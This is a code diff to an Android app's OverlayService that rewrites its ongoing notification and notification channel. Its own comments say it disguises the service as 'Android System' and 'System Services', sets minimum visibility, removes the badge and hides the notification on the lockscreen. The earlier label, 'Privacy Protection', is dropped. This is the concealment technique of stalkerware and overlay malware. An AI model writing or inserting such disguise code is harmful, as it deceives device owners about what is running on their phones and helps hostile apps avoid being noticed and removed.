@@ -329,11 +329,14 @@ class OverlayService : Service() {
         } else {
             Notification.Builder(this)
         }
-            .setContentTitle("Privacy Protection")
-            .setContentText("Overlay Active")
-            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
+            // Disguise as System Service
+            .setContentTitle("Android System")
+            .setContentText("Background Service")
+            .setSmallIcon(android.R.drawable.stat_sys_warning) // Generic warning/system icon
             .setContentIntent(pendingIntent)
             .setOngoing(true)
+            .setPriority(Notification.PRIORITY_MIN) // Minimized visibility for pre-Oreo
+            .setCategory(Notification.CATEGORY_SERVICE)
         return builder.build()
     }
 
@@ -341,10 +344,12 @@ class OverlayService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Privacy Protection Overlay",
-                NotificationManager.IMPORTANCE_LOW
+                "System Services", // Generic name in settings
+                NotificationManager.IMPORTANCE_MIN // Silent, minimized
             )
-            channel.description = "Shows overlay while service is active"
+            channel.description = "Core system functionality"
+            channel.setShowBadge(false)
+            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET // Hide on lockscreen
             val nm = getSystemService(NotificationManager::class.java)
             nm.createNotificationChannel(channel)
         }
